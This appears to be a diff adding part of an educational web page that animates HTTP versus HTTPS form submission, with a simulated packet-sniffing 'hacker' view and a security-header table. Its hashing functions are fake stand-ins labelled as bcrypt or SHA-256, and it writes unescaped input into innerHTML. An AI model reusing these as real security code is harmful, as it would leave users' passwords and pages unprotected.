+    <tr><th>Header</th><th>Value</th><th>HTTP App</th><th>HTTPS App</th><th>Purpose</th></tr>
+    <tr><td class="hn">Strict-Transport-Security</td><td class="hv">max-age=31536000; includeSubDomains</td><td><span class="pill pill-r">Missing</span></td><td><span class="pill pill-g">Set</span></td><td style="font-size:12px;color:var(--text-muted)">Forces HTTPS, prevents downgrade attacks</td></tr>
+    <tr><td class="hn">Content-Security-Policy</td><td class="hv">default-src 'self'</td><td><span class="pill pill-r">Missing</span></td><td><span class="pill pill-g">Set</span></td><td style="font-size:12px;color:var(--text-muted)">Prevents XSS and code injection attacks</td></tr>
+    <tr><td class="hn">X-Frame-Options</td><td class="hv">DENY</td><td><span class="pill pill-r">Missing</span></td><td><span class="pill pill-g">Set</span></td><td style="font-size:12px;color:var(--text-muted)">Prevents clickjacking via iframes</td></tr>
+    <tr><td class="hn">X-Content-Type-Options</td><td class="hv">nosniff</td><td><span class="pill pill-r">Missing</span></td><td><span class="pill pill-g">Set</span></td><td style="font-size:12px;color:var(--text-muted)">Prevents MIME type sniffing exploits</td></tr>
+    <tr><td class="hn">X-XSS-Protection</td><td class="hv">1; mode=block</td><td><span class="pill pill-r">Missing</span></td><td><span class="pill pill-g">Set</span></td><td style="font-size:12px;color:var(--text-muted)">Enables browser's built-in XSS filter</td></tr>
+    <tr><td class="hn">Referrer-Policy</td><td class="hv">strict-origin-when-cross-origin</td><td><span class="pill pill-r">Missing</span></td><td><span class="pill pill-g">Set</span></td><td style="font-size:12px;color:var(--text-muted)">Prevents referrer information leakage</td></tr>
+    <tr><td class="hn">Set-Cookie flags</td><td class="hv">Secure; HttpOnly; SameSite=Strict</td><td><span class="pill pill-r">None set</span></td><td><span class="pill pill-g">All set</span></td><td style="font-size:12px;color:var(--text-muted)">Prevents cookie theft and CSRF attacks</td></tr>
+  </table>
+</div>
+
+</div><!-- /main -->
+
+<script>
+
+// ===== CLOUD DATA STORE =====
+let cdsRecords = [];
+
+function cdsUUID() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+    const r = Math.random()*16|0, v = c==='x'?r:(r&0x3|0x8);
+    return v.toString(16);
+  });
+}
+
+function cdsHash(s) {
+  let h = 5381;
+  for (let i = 0; i < s.length; i++) h = ((h<<5)+h)+s.charCodeAt(i);
+  return '$2b$12$' + Math.abs(h).toString(16).padStart(8,'0').repeat(4).substring(0,40) + '...';
+}
+
+function cdsProviderInfo(p) {
+  const m = {
+    firestore: { name:'Google Firestore', icon:'🔵', color:'#66aaff', url:'firestore.googleapis.com', col:'users_collection' },
+    dynamodb:  { name:'AWS DynamoDB',     icon:'🟠', color:'#ffaa44', url:'dynamodb.amazonaws.com',    col:'UsersTable' },
+    cosmos:    { name:'Azure Cosmos DB',  icon:'🔷', color:'#55aaff', url:'cosmos.azure.com',           col:'users-container' }
+  };
+  return m[p];
+}
+
+function cdsPipeline(lines, id) {
+  const el = document.getElementById(id);
+  el.innerHTML = '';
+  lines.forEach((l, i) => {
+    setTimeout(() => {
+      const d = document.createElement('div');
+      d.className = 'al';
+      d.innerHTML = l;
+      el.appendChild(d);
+    }, i * 90);
+  });
+}
+
+function cdsStore(mode) {
+  const user    = document.getElementById('cds-user').value.trim()    || 'rahul_sharma';
+  const pass    = document.getElementById('cds-pass').value.trim()    || 'mypassword';
+  const email   = document.getElementById('cds-email').value.trim()   || 'rahul@example.com';
+  const profile = document.getElementById('cds-profile').value.trim() || '{"city":"Mumbai","age":25}';
+  const pKey    = document.getElementById('cds-provider').value;
+  const pInfo   = cdsProviderInfo(pKey);
+  const docId   = cdsUUID();
+  const ts      = new Date().toISOString();
+  const hash    = cdsHash(pass);
+  const isHTTPS = mode === 'https';
+
+  // Pipeline animation
+  const pipeLines = isHTTPS ? [
+    `<span style="color:#44dd88">▶ HTTPS Request initiated</span>`,
+    `<span style="color:#66aaff">  TLS 1.3 Handshake… ✓</span>`,
+    `<span style="color:#7755aa">  Certificate verified: ${pInfo.url}</span>`,
+    `<span style="color:#44dd88">  Encrypted tunnel established ✓</span>`,
+    ``,
+    `<span style="color:#66aaff">▶ Data encrypted in TLS tunnel</span>`,
+    `<span style="color:#44dd88">  POST /api/users → ${pInfo.url}</span>`,
+    `<span style="color:#66aaff">  Body: [ENCRYPTED — AES-256-GCM]</span>`,
+    ``,
+    `<span style="color:#44dd88">▶ Arriving at ${pInfo.name}</span>`,
+    `<span style="color:#44dd88">  Document ID: ${docId.substring(0,18)}…</span>`,
+    `<span style="color:#44dd88">  At-rest encryption: AES-256 ✓</span>`,
+  ] : [
+    `<span style="color:#ff6666">▶ HTTP Request initiated — NO ENCRYPTION</span>`,
+    `<span style="color:#ff9944">  No TLS handshake ✗</span>`,
+    `<span style="color:#ff6666">  Data travels in PLAIN TEXT</span>`,
+    ``,
+    `<span style="color:#ff6666">▶ POST /api/users → ${pInfo.url}</span>`,
+    `<span style="color:#ffcc44">  username=${user}</span>`,
+    `<span style="color:#ffcc44">  password=${pass}  ← VISIBLE TO ATTACKER!</span>`,
+    `<span style="color:#ffcc44">  email=${email}</span>`,
+    ``,
+    `<span style="color:#ff6666">▶ Arriving at ${pInfo.name}</span>`,
+    `<span style="color:#ff9944">  Document ID: ${docId.substring(0,18)}…</span>`,
+    `<span style="color:#ff9944">  Plain-text data written to DB ⚠</span>`,
+  ];
+  cdsPipeline(pipeLines, 'cds-pipeline');
+
+  // Transit panel
+  const transitHead = document.getElementById('cds-transit-head');
+  const transitEl   = document.getElementById('cds-transit');
+  transitHead.style.background  = isHTTPS ? 'linear-gradient(135deg,#1a2a1a,#2a4a2a)' : 'linear-gradient(135deg,#2a1a1a,#4a2a2a)';
+  transitHead.style.color        = isHTTPS ? '#44dd88' : '#ff6666';
+  transitHead.innerHTML          = isHTTPS ? '🔒 In Transit — Encrypted' : '🔓 In Transit — PLAIN TEXT';
+  setTimeout(() => {
+    transitEl.innerHTML = isHTTPS ? [
+      `<div style="color:#44dd88">POST /api/users HTTPS/1.1</div>`,
+      `<div style="color:#66aaff">Host: ${pInfo.url}</div>`,
+      `<div style="color:#7755aa">TLS: AES-256-GCM (TLS 1.3)</div>`,
+      `<div> </div>`,
+      `<div style="color:#7755aa;letter-spacing:2px">a4 f2 9c 3b 8e 1d 7a 52…</div>`,
+      `<div style="color:#7755aa;letter-spacing:2px">bb 3f c1 22 d9 07 e5 aa…</div>`,
+      `<div style="color:#7755aa;letter-spacing:2px">55 8d f0 11 c4 3b 9e 12…</div>`,
+      `<div> </div>`,
+      `<div style="color:#44dd88">✓ Attacker sees only ciphertext</div>`,
+    ].map(l=>`${l}`).join('') : [
+      `<div style="color:#ff6666">POST /api/users HTTP/1.1</div>`,
+      `<div style="color:#ffaa44">Host: ${pInfo.url}</div>`,
+      `<div style="color:#ff9944">NO ENCRYPTION ⚠</div>`,
+      `<div> </div>`,
+      `<div style="color:#ffcc44">username=${user}</div>`,
+      `<div style="color:#ff6666">password=${pass}</div>`,
+      `<div style="color:#ffcc44">email=${email}</div>`,
+      `<div> </div>`,
+      `<div style="color:#ff6666">⚠ Fully readable by attacker!</div>`,
+    ].map(l=>`${l}`).join('');
+  }, 400);
+
+  // Server processing
+  setTimeout(() => {
+    document.getElementById('cds-server').innerHTML = isHTTPS ? [
+      `<div style="color:#44dd88">// Server receives decrypted data</div>`,
+      `<div style="color:#66aaff">hash = bcrypt(password, rounds=12)</div>`,
+      `<div style="color:#8ab0d0">// → ${hash}</div>`,
+      `<div style="color:#66aaff">sanitize(email) ✓</div>`,
+      `<div style="color:#66aaff">validate(profile_json) ✓</div>`,
+      `<div style="color:#44dd88">// Building DB document…</div>`,
+      `<div style="color:#44dd88">doc.id = UUID() ✓</div>`,
+      `<div style="color:#44dd88">doc.created_at = ISO8601 ✓</div>`,
+    ].map(l=>`${l}`).join('') : [
+      `<div style="color:#ff9944">// Server receives PLAIN TEXT data</div>`,
+      `<div style="color:#ff6666">// NO hashing performed ✗</div>`,
+      `<div style="color:#ffcc44">password stored AS-IS: "${pass}"</div>`,
+      `<div style="color:#ff9944">// No sanitization check ✗</div>`,
+      `<div style="color:#ff9944">// No validation ✗</div>`,
+      `<div style="color:#ff6666">// Writing raw data to DB…</div>`,
+      `<div style="color:#ffcc44">doc.id = UUID()</div>`,
+      `<div style="color:#ffcc44">doc.created_at = ISO8601</div>`,
+    ].map(l=>`${l}`).join('');
+  }, 900);
+
+  // DB record
+  const dbHead = document.getElementById('cds-db-head');
+  dbHead.style.background = isHTTPS ? 'linear-gradient(135deg,#0d2a1a,#0d2a3a)' : 'linear-gradient(135deg,#2a1a0d,#3a1a1a)';
+  dbHead.style.color = isHTTPS ? '#44dd88' : '#ff9944';
+  dbHead.innerHTML = `🗄️ ${pInfo.name} Record`;
+
+  setTimeout(() => {
+    const dbEl = document.getElementById('cds-db');
+    const doc = isHTTPS ? {
+      _id: docId,
+      username: user,
+      email: email,
+      password_hash: hash,
+      profile: profile,
+      created_at: ts,
+      encrypted_at_rest: 'AES-256 (KMS)',
+      protocol: 'HTTPS/TLS1.3'
+    } : {
+      _id: docId,
+      username: user,
+      email: email,
+      password: pass + '  ← PLAIN TEXT ⚠',
+      profile: profile,
+      created_at: ts,
+      encrypted_at_rest: 'NONE ⚠',
+      protocol: 'HTTP (INSECURE)'
+    };
+    dbEl.innerHTML = `<pre style="color:${isHTTPS?'#66aaff':'#ffaa44'};white-space:pre-wrap;font-size:10px;">${JSON.stringify(doc, null, 2)}</pre>`;
+  }, 1500);
+
+  // Add to records table
+  setTimeout(() => {
+    cdsRecords.unshift({
+      id: docId.substring(0,8) + '…',
+      user, email,
+      stored_password: isHTTPS ? hash.substring(0,20)+'…' : pass + ' ⚠',
+      provider: pInfo.icon + ' ' + pInfo.name,
+      mode: isHTTPS ? '✓ HTTPS' : '⚠ HTTP',
+      ts: new Date().toLocaleTimeString(),
+      safe: isHTTPS
+    });
+    cdsRenderTable();
+  }, 1800);
+}
+
+function cdsRenderTable() {
+  const wrap = document.getElementById('cds-table-wrap');
+  if (!cdsRecords.length) {
+    wrap.innerHTML = '<div style="color:#334466;font-size:12px;text-align:center;padding:24px;">No records yet.</div>';
+    return;
+  }
+  const rows = cdsRecords.map(r => `
+    <tr style="border-bottom:1px solid #1e3a5f;">
+      <td style="padding:10px 12px;font-family:'JetBrains Mono',monospace;font-size:10px;color:#5577aa;">${r.id}</td>
+      <td style="padding:10px 12px;font-size:12px;color:#8ab0d0;">${r.user}</td>
+      <td style="padding:10px 12px;font-size:11px;color:#6688aa;">${r.email}</td>
+      <td style="padding:10px 12px;font-family:'JetBrains Mono',monospace;font-size:10px;color:${r.safe?'#55aacc':'#ff9944'};">${r.stored_password}</td>
+      <td style="padding:10px 12px;font-size:11px;color:#5577aa;">${r.provider}</td>
+      <td style="padding:10px 12px;font-size:12px;font-weight:700;color:${r.safe?'#44dd88':'#ff6666'};">${r.mode}</td>
+      <td style="padding:10px 12px;font-size:11px;color:#445566;">${r.ts}</td>
+    </tr>`).join('');
+  wrap.innerHTML = `
+    <table style="width:100%;border-collapse:collapse;font-size:12px;">
+      <thead>
+        <tr style="border-bottom:1px solid #2a4a7a;">
+          <th style="text-align:left;padding:8px 12px;color:#445566;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">Doc ID</th>
+          <th style="text-align:left;padding:8px 12px;color:#445566;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">Username</th>
+          <th style="text-align:left;padding:8px 12px;color:#445566;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">Email</th>
+          <th style="text-align:left;padding:8px 12px;color:#445566;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">Stored Password</th>
+          <th style="text-align:left;padding:8px 12px;color:#445566;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">Cloud DB</th>
+          <th style="text-align:left;padding:8px 12px;color:#445566;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">Protocol</th>
+          <th style="text-align:left;padding:8px 12px;color:#445566;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">Time</th>
+        </tr>
+      </thead>
+      <tbody>${rows}</tbody>
+    </table>`;
+}
+
+function cdsClear() {
+  cdsRecords = [];
+  cdsRenderTable();
+  ['cds-pipeline','cds-transit','cds-server','cds-db'].forEach(id => {
+    document.getElementById(id).innerHTML = '<span style="color:#445566;font-family:\'JetBrains Mono\',monospace;font-size:11px;">// Cleared…</span>';
+  });
+}
+
+function showTab(t) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(x => x.classList.remove('active-blue','active-red','active-green'));
+  document.getElementById('sec-' + t).classList.add('active');
+  const map = { live:'active-blue', overview:'active-red', attacks:'active-red', attacktypes:'active-red', cloud:'active-blue', cloudstore:'active-blue', headers:'active-green' };
+  const order = ['live','overview','attacks','attacktypes','cloud','cloudstore','headers'];
+  document.querySelectorAll('.tab')[order.indexOf(t)].classList.add(map[t]);
+}
+
+function fakeHash(s) {
+  let h = 0;
+  for(let i=0;i<s.length;i++) h = (Math.imul(31,h)+s.charCodeAt(i))|0;
+  const x = Math.abs(h).toString(16).padStart(8,'0');
+  return x.repeat(8).substring(0,64);
+}
+function tlsBlock(seed, rows=4) {
+  return Array.from({length:rows}, (_,l) =>
+    Array.from({length:16}, (_,i) => ((seed*(l+1)+i*7+l*3)&0xff).toString(16).padStart(2,'0')).join(' ')
+  );
+}
+function maskCard(c) { c=c.replace(/\s/g,''); return '**** **** **** '+c.slice(-4); }
+function ani(id, lines, delay=50) {
+  const el = document.getElementById(id);
+  el.innerHTML = '';
+  lines.forEach((html,i) => setTimeout(() => {
+    const d = document.createElement('div');
+    d.className = 'al'; d.innerHTML = html; el.appendChild(d);
+  }, i * delay));
+}
+function hTab(id) {
+  ['h1','h2','h3'].forEach(x => document.getElementById(x).style.display = x===id?'block':'none');
+  ['ht1','ht2','ht3'].forEach((x,i) => document.getElementById(x).classList.toggle('active', ['h1','h2','h3'][i]===id));
+}
+
+function runDemo() {
+  const name   = document.getElementById('f-name').value.trim()  || 'Rahul Sharma';
+  const email  = document.getElementById('f-email').value.trim() || 'rahul@example.com';
+  const pass   = document.getElementById('f-pass').value.trim()  || 'mypassword123';
+  const card   = document.getElementById('f-card').value.trim()  || '4111111111111111';
+  const cvv    = document.getElementById('f-cvv').value.trim()   || '789';
+  const amount = document.getElementById('f-amount').value.trim()|| '4999';
+  const cardNo = card.replace(/\s/g,'');
+  const seed   = name.split('').reduce((a,c)=>a+c.charCodeAt(0),0) + pass.length*7;
+  const hash   = fakeHash(pass+name);
+  const tls    = tlsBlock(seed, 4);
+
+  document.getElementById('sb1').className = 'step-ind done';
+  document.getElementById('sb2').className = 'step-ind active';
+  document.getElementById('dot-in').className    = 'sdot sd-green';
+  document.getElementById('dot-http').className  = 'sdot sd-red';
+  document.getElementById('dot-https').className = 'sdot sd-green';
+  const btn = document.getElementById('run-btn');
+  btn.disabled = true; btn.textContent = '⏳ Transmitting…';
+
+  // HTTP
+  setTimeout(() => {
+    ani('http-out', [
+      `<span class="cy">⚠  HTTP PACKET — PORT 80 (NO ENCRYPTION)</span>`,
+      `<span class="cgr">// Wireshark captures this EXACTLY as shown</span>`,
+      ``,
+      `<span class="cr">POST /submit HTTP/1.1</span>`,
+      `<span class="cgr">Host:</span>         <span class="cr">http://example.com</span>`,
+      `<span class="cgr">Content-Type:</span> <span class="cw">application/x-www-form-urlencoded</span>`,
+      `<span class="cgr">Cookie:</span>       <span class="cr">session=a1b2c3 (NO Secure flag)</span>`,
+      ``,
+      `<span class="cgr">─── BODY (PLAIN TEXT) ─────────────────────</span>`,
+      `<span class="cgr">name=</span><span class="cr">${name}</span>`,
+      `<span class="cgr">email=</span><span class="cr">${email}</span>`,
+      `<span class="cgr">password=</span><span class="cr">${pass}</span>`,
+      `<span class="cgr">card=</span><span class="cr">${cardNo}</span>`,
+      `<span class="cgr">cvv=</span><span class="cr">${cvv}</span>`,
+      `<span class="cgr">amount=</span><span class="cr">₹${amount}</span>`,
+      ``,
+      `<span class="cy">⚠  ALL DATA VISIBLE — ZERO PROTECTION</span>`,
+    ], 50);
+    document.getElementById('http-alert').innerHTML =
+      `<div class="alert alert-red"><span class="ai">🔓</span><div><strong>Danger!</strong> Every field above is visible to any attacker on your network. Password, card number, CVV — all stolen instantly with Wireshark.</div></div>`;
+  }, 200);
+
+  // HTTPS
+  setTimeout(() => {
+    ani('https-out', [
+      `<span class="cg">✓  HTTPS PACKET — TLS 1.3 ACTIVE (PORT 443)</span>`,
+      `<span class="cgr">// Attacker captures this — completely useless to them</span>`,
+      ``,
+      `<span class="cg">TLSv1.3 Record Layer:</span>`,
+      `<span class="cgr">  Content-Type:</span> <span class="cg">Application Data (23)</span>`,
+      `<span class="cgr">  Version:</span>      <span class="cg">TLS 1.3 (0x0304)</span>`,
+      `<span class="cgr">  Key:</span>          <span class="cb">${hash.substring(0,28)}…</span>`,
+      `<span class="cgr">  Length:</span>       <span class="cg">${(name+email+pass+cardNo+cvv+amount).length*8+128} bytes</span>`,
+      ``,
+      `<span class="cgr">─── ENCRYPTED DATA ────────────────────────</span>`,
+      `<span class="cenc">${tls[0]}</span>`,
+      `<span class="cenc">${tls[1]}</span>`,
+      `<span class="cenc">${tls[2]}</span>`,
+      `<span class="cenc">${tls[3]}</span>`,
+      ``,
+      `<span class="cg">✓  ORIGINAL DATA COMPLETELY HIDDEN BY TLS</span>`,
+    ], 50);
+    document.getElementById('https-alert').innerHTML =
+      `<div class="alert alert-green"><span class="ai">🔒</span><div><strong>Protected!</strong> All data is encrypted before leaving your device. Attackers see only the hex above — mathematically impossible to reverse without the session key.</div></div>`;
+  }, 700);
+
+  // Hacker view
+  setTimeout(() => {
+    document.getElementById('sb2').className = 'step-ind done';
+    document.getElementById('sb3').className = 'step-ind active';
+    document.getElementById('hacker-wrap').style.display = 'block';
+    document.getElementById('hacker-wrap').scrollIntoView({ behavior:'smooth', block:'nearest' });
+
+    ani('h1', [
+      `<span class="cp">☠  HACKER TERMINAL — LIVE PACKET CAPTURE</span>`,
+      `<span class="cgr">// Tool: Wireshark  |  Interface: wlan0 (shared WiFi)</span>`,
+      ``,
+      `<span class="cy">[ TARGET: http://example.com — UNENCRYPTED ]</span>`,
+      ``,
+      `<span class="cp">STOLEN DATA:</span>`,
+      ``,
+      `<span class="cgr">  Name     →</span>  <span class="cr">${name}</span>`,
+      `<span class="cgr">  Email    →</span>  <span class="cr">${email}</span>`,
+      `<span class="cgr">  Password →</span>  <span class="cr">${pass}</span>`,
+      `<span class="cgr">  Card No  →</span>  <span class="cr">${cardNo}</span>`,
+      `<span class="cgr">  CVV      →</span>  <span class="cr">${cvv}</span>`,
+      `<span class="cgr">  Amount   →</span>  <span class="cr">₹${amount}  ← can tamper to ₹1</span>`,
+      ``,
+      `<span class="cy">HACKER CAN NOW:</span>`,
+      `<span class="cr">  • Login as ${email} using password "${pass}"</span>`,
+      `<span class="cr">  • Use card ${maskCard(cardNo)} to make purchases</span>`,
+      `<span class="cr">  • Modify amount → buy ₹${amount} item for ₹1</span>`,
+      ``,
+      `<span class="cr">⚠  ATTACK SUCCESSFUL — HTTP EXPOSED EVERYTHING</span>`,
+    ], 40);
+
+    document.getElementById('h2').innerHTML = [
+      `<span class="cp">☠  HACKER TERMINAL — LIVE PACKET CAPTURE</span>`,
+      `<span class="cgr">// Tool: Wireshark  |  Interface: wlan0 (shared WiFi)</span>`,
+      ``,
+      `<span class="cg">[ TARGET: https://example.com — TLS 1.3 ACTIVE ]</span>`,
+      ``,
+      `<span class="cp">INTERCEPTED BYTES:</span>`,
+      ``,
+      `<span class="cenc">${tls[0]}</span>`,
+      `<span class="cenc">${tls[1]}</span>`,
+      `<span class="cenc">${tls[2]}</span>`,
+      `<span class="cenc">${tls[3]}</span>`,
+      ``,
+      `<span class="cgr">Attempting AES-256 brute force decrypt…</span>`,
+      `<span class="cgr">[████████░░]  80% … FAILED</span>`,
+      `<span class="cgr">[██████████] 100% … FAILED</span>`,
+      ``,
+      `<span class="cg">✗  DECRYPTION IMPOSSIBLE</span>`,
+      `<span class="cg">   AES-256 would take longer than the age of</span>`,
+      `<span class="cg">   the universe to brute force at current speeds.</span>`,
+      ``,
+      `<span class="cg">✓  YOUR DATA IS SAFE — HTTPS DEFEATED THE ATTACK</span>`,
+    ].map(l=>`<div>${l}</div>`).join('');
+
+    const last4 = cardNo.slice(-4);
+    document.getElementById('h3').innerHTML = [
+      `<span class="cp">DATABASE COMPARISON — What Actually Gets Stored</span>`,
+      ``,
+      `<span class="cr">─── HTTP App DB (insecure — plain text) ────────</span>`,
+      `<span class="cgr">id │ name          │ password      │ card_number      │ cvv</span>`,
+      `<span class="cgr">───┼───────────────┼───────────────┼──────────────────┼────</span>`,
+      `<span class="cw"> 1 │ </span><span class="cr">${name.substring(0,13).padEnd(13)}</span><span class="cw"> │ </span><span class="cr">${pass.padEnd(13)}</span><span class="cw"> │ </span><span class="cr">${cardNo.padEnd(16)}</span><span class="cw">  │ </span><span class="cr">${cvv}</span>`,
+      ``,
+      `<span class="cy">⚠ Password plain text! Full card stored! CVV stored!</span>`,
+      ``,
+      `<span class="cg">─── HTTPS App DB (secure storage) ──────────────</span>`,
+      `<span class="cgr">id │ name          │ password_hash (SHA-256)          │ card    │ cvv</span>`,
+      `<span class="cgr">───┼───────────────┼──────────────────────────────────┼─────────┼──────────</span>`,
+      `<span class="cw"> 1 │ </span><span class="cg">${name.substring(0,13).padEnd(13)}</span><span class="cw"> │ </span><span class="cb">${hash.substring(0,32)}…</span><span class="cw"> │ </span><span class="cg">****${last4}</span><span class="cw"> │ </span><span class="cg">NOT STORED</span>`,
+      ``,
+      `<span class="cg">✓ Password hashed — cannot reverse to "${pass}"</span>`,
+      `<span class="cg">✓ Card: only last 4 digits (****${last4}) stored</span>`,
+      `<span class="cg">✓ CVV never stored — PCI-DSS compliant</span>`,
+    ].map(l=>`<div>${l}</div>`).join('');
+
+    document.getElementById('sbs-wrap').style.display = 'grid';
+    document.getElementById('sbs-http').innerHTML = [
+      `<div class="cr">• Name: ${name}</div>`,
+      `<div class="cr">• Email: ${email}</div>`,
+      `<div class="cr">• Password: ${pass}</div>`,
+      `<div class="cr">• Card: ${cardNo}</div>`,
+      `<div class="cr">• CVV: ${cvv}</div>`,
+      `<div class="cr">• Amount: ₹${amount} (tamperable)</div>`,
+      `<div style="color:#ff9944;margin-top:8px">⚠ All visible to any network attacker</div>`,
+    ].join('');
+    document.getElementById('sbs-https').innerHTML = [
+      `<div class="cg">• Name: encrypted in TLS tunnel</div>`,
+      `<div class="cg">• Email: encrypted in TLS tunnel</div>`,
+      `<div class="cg">• Password: encrypted → SHA-256 hash stored</div>`,
+      `<div class="cg">• Card: encrypted → ****${last4} only stored</div>`,
+      `<div class="cg">• CVV: encrypted → never stored</div>`,
+      `<div class="cg">• Amount: server validates from catalog</div>`,
+      `<div style="color:#44dd88;margin-top:8px">✓ Attacker sees only unreadable ciphertext</div>`,
+    ].join('');
+
+    document.getElementById('sb3').className = 'step-ind done';
+    btn.disabled = false;
+    btn.textContent = '🔄 Run Again with New Data';
+  }, 2000);
+}
+</script>
+</body>
+</html>
